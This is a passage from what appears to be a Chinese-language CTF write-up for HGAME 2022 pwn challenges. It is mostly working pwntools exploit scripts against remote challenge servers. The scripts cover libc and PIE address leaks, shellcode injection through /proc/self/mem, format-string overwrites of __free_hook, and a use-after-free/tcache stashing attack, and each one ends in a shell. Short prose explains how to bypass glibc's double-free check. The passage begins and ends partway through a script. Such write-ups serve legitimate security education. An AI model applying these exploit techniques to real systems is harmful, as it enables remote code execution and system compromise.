&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;edges?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;node?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;to ?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(-(<span class="number">0xB720</span> - <span class="number">0x6F80</span>)/<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot; is &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">lbase = leak_addr - libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak programme base</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;nodes?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;edges?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;node?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;to ?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(-(<span class="number">0xB720</span> - <span class="number">0x7008</span>)/<span class="number">8</span>))</span><br><span class="line">r.recvuntil(<span class="string">&quot; is &quot;</span>)</span><br><span class="line">pie_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">spfa_base = pie_addr - <span class="number">0x7008</span></span><br><span class="line">log.success(<span class="string">&quot;spfa_base:&quot;</span> + <span class="built_in">hex</span>(spfa_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak stack_addr</span></span><br><span class="line">env_addr = lbase + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(env_addr))</span><br><span class="line">r.recvuntil(<span class="string">&quot;nodes?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;edges?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;node?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;to ?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>((env_addr-spfa_base-<span class="number">0xB720</span>)/<span class="number">8</span>))</span><br><span class="line">r.recvuntil(<span class="string">&quot; is &quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line"></span><br><span class="line">stack_ret = stack_addr-<span class="number">0x100</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;nodes?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;edges?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\nformat&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bias = (stack_ret-spfa_base-<span class="number">0xB720</span>)/<span class="number">8</span></span><br><span class="line">r.sendline(<span class="string">&quot;0 &quot;</span>+<span class="built_in">str</span>(bias)+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(spfa_base+backd00r_addr))</span><br><span class="line">r.recvuntil(<span class="string">&quot;node?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;to ?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="week2">week2</h2>
<h3 id="blind">blind</h3>
<p>​	proc 文件系统，根据题目提示的 “喷射” 找到 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7189?page=34">https://xz.aliyun.com/t/7189?page=34</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;chuj.top&quot;</span>, <span class="number">51693</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">hash_code = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line"></span><br><span class="line">charset = string.printable</span><br><span class="line">proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;write: &quot;</span>)</span><br><span class="line">write_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&quot;\n&quot;</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)</span><br><span class="line">lbase = write_addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">libc_start_main = lbase+libc.dump(<span class="string">&quot;__libc_start_main&quot;</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">sh.send(<span class="string">&quot;/proc/self/mem&quot;</span>)</span><br><span class="line">shellcode = <span class="string">&quot;\x90&quot;</span>*<span class="number">0x2fd0</span>+asm(shellcraft.sh())		<span class="comment">#添加 slide code 增加执行 shellcode 的概率</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">sh.send(<span class="built_in">str</span>(libc_start_main))			<span class="comment">#执行完会返回到 libc_start_main</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="echo-sever">echo_sever</h3>
<p>​	堆上的格式化字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./echo&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">52061</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">f = ELF(<span class="string">&#x27;./echo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line"></span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%6$p-%13$p&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">rbp = <span class="built_in">int</span>(r.recvuntil(<span class="string">&quot;-&quot;</span>).strip(<span class="string">&#x27;-&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)-<span class="number">243</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">lbase = leak_addr - libc.symbols[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(lbase))</span><br><span class="line"></span><br><span class="line">free_hook = lbase+libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">system_addr = lbase+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((rbp+<span class="number">0x18</span>+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c&quot;</span>+<span class="string">&quot;%6$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((free_hook&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&quot;%10$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((rbp+<span class="number">0x18</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c&quot;</span>+<span class="string">&quot;%6$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((free_hook+<span class="number">4</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&quot;%10$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((system_addr&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&quot;%13$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((free_hook+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&quot;%10$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((system_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&quot;%13$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((free_hook)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&quot;%10$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((system_addr)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&quot;%13$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="oldfashion-note">oldfashion_note</h3>
<h4 id="思路-2">思路</h4>
<img src="/HGAME2022-Pwn-wp/image-20220212172253010.png" class="">
<p>程序有add，delete，show这几个功能，delete 函数中未将指针置零，存在 UAF 漏洞</p>
<p>首先要利用 show 功能 leak 出 libc 基址，此处用到 <code>Unsorted Bin Leak</code>（首先要填满 tcache 才能通过 free 进入 unsorted bin）</p>
<p>获得 libc 基址后考虑劫持钩子函数 <code>__free_hook</code> 为 <code>system</code>，因为题目使用的库版本是 <code>libc-2.31.so</code> 所以 <code>tcache</code> 的 <code>double free</code> 会有检测（libc2.29以上的版本），可通过 <code>stash</code> 绕过</p>
<h4 id="tcache相关">tcache相关</h4>
<blockquote>
<p>当所请求的分配大小不大于<code>0x408</code>并且当<strong>给定大小</strong>的 tcache bin 未满时调用 <code>tcache_put</code>。一个 tcache bin 中的最大块数<code>mp_.tcache_count</code>是<code>7</code></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">   <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span>		<span class="comment">//新增的check字段</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">     <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">    tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">       trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">       2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely coincidence</span></span><br><span class="line"><span class="comment">       before aborting.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))		<span class="comment">//check</span></span><br><span class="line">      &#123;</span><br><span class="line">       tcache_entry *tmp;</span><br><span class="line">       LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">       <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">            tmp;</span><br><span class="line">            tmp = tmp-&gt;next)</span><br><span class="line">         <span class="keyword">if</span> (tmp == e)</span><br><span class="line">           malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">       <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a few</span></span><br><span class="line"><span class="comment">          cycles, but don&#x27;t abort.  */</span></span><br><span class="line">    &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p><code>double free</code> 会将 key 字段置为 tcache，无法通过上面的检测</p>
<p>为了绕过这一检测大致有两种方法：</p>
<ol>
<li>修改 key 字段</li>
<li><code>tcache stashing unlink attack</code></li>
</ol>
<p>如果程序有 edit 功能的话就可以修改 key 字段来绕过检测，但本题没有提供所以考虑 <code>tcache stashing unlink attack</code></p>
<blockquote>
<p>这种攻击利用的是 tcache bin 有剩余 (数量小于 <code>TCACHE_MAX_BINS</code> ) 时，同大小的 small bin 或 fast bin 会放进 tcache 中，<strong>在获取到一个 <code>small bin/fast bin</code> 中的一个 chunk 后如果 tcache 仍有足够空闲位置，会将剩余的 <code>small bin/fast bin</code> 链入 tcache</strong> ，在这个过程中只对第一个 bin 进行了完整性检查，后面的堆块的检查缺失。当攻击者可以写一个 small bin 的 bk 指针 或 fast bin 的 fd 指针时，其可以在任意地址上写一个 libc 地址</p>
</blockquote>
<img src="/HGAME2022-Pwn-wp/image-20220212205918419.png" class="" title="image-20220212205918419">
<p>先将相同大小的 tcache 清空，以便分配到 fast bin 的堆块</p>
<img src="/HGAME2022-Pwn-wp/image-20220212210405503.png" class="" title="image-20220212210405503">
<p>分配 <code>fast bin</code> 中的堆块，剩下的部分链入 tcache</p>
<img src="/HGAME2022-Pwn-wp/image-20220212210556170.png" class="" title="image-20220212210556170">
<h4 id="Unsorted-bin-leak">Unsorted bin leak</h4>
<p>​    unsorted bin 结构如下，是循环双向链表</p>
<img src="/HGAME2022-Pwn-wp/unsortedbins-struct.jpg" class="">
<p>​    可以看出 show bin2 中的内容就可以获得 <code>main_arena</code> 内的一个地址（要防止与 <code>top chunk</code> 合并），而 <code>main_arena</code> 与 <code>__malloc_hook</code> 固定差 0x10 从而计算得到 libc 基址</p>
<h4 id="fast-bin-attack">fast bin attack</h4>
<img src="/HGAME2022-Pwn-wp/image-20220212180348216.png" class="">
<p>​    之后重新分配堆块得到 chunk1 ，将其 fd 指针置为 <code>fake chunk</code> 就可以实现任意写</p>
<h4 id="exp-2">exp</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./note&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">51475</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line"></span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line"></span><br><span class="line"><span class="comment">#unsorted bin leak</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):          <span class="comment">#填满tcache 7  size相同</span></span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x10</span>,<span class="string">&#x27;protected&#x27;</span>)     <span class="comment">#防止合并进top chunk</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(malloc_hook))</span><br><span 